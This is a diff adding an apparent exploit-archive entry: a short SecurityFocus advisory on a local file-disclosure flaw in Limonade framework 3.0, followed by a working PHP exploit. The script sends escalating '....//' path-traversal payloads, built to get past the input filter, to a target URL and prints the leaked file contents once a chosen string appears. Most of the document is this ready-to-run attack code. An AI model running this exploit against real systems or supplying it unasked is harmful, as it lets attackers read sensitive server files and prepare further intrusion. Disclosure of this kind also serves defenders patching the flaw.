@@ -1,0 +1,54 @@
+source: http://www.securityfocus.com/bid/63771/info
+
+Limonade framework is prone to a local file-disclosure vulnerability because it fails to sanitize user-supplied input.
+
+An attacker may leverage this issue to obtain sensitive information from local files on computers running the vulnerable application. This may aid in further attacks.
+
+Limonade framework 3.0 vulnerable; other versions may also be affected. 
+
+<?php
+/** To prevent of time out **/
+set_time_limit(0);
+ 
+/** Error reporting **/
+error_reporting(0);
+ 
+/** Necessary variables **/
+$url = $argv[1];
+$data = $argv[2];
+$needle = $argv[3];
+ 
+/** Curl function with appropriate adjustments **/
+function CurlPost($url='localhost',$data=array())
+{
+    $ch = curl_init();
+    curl_setopt($ch,CURLOPT_URL,$url);
+    curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,FALSE);
+    curl_setopt($ch,CURLOPT_SSL_VERIFYHOST,2);
+    curl_setopt($ch,CURLOPT_HEADER,1);
+    curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
+    curl_setopt($ch,CURLOPT_TIMEOUT,50);
+    curl_setopt($ch,CURLOPT_POST,true);
+    curl_setopt($ch,CURLOPT_POSTFIELDS,$data);
+    return curl_exec($ch);
+    curl_close($ch);
+}
+ 
+list($param,$file) = explode(':',$data);
+ 
+$FilterBypassing = '....//';
+for($i=0;$i<10;$i++)
+{
+    $DataToPost[$param] = $FilterBypassing.$file;
+    $response = CurlPost($url,$DataToPost);
+    if(strstr($response,$needle)!==FALSE)
+    {
+        echo $response;
+        echo "\n\nExploited successfully!\n";
+        echo 'Payload: ',$DataToPost[$param],"\n\n\n";
+        die();
+    }
+     
+    $FilterBypassing .= '....//';
+}
+?>
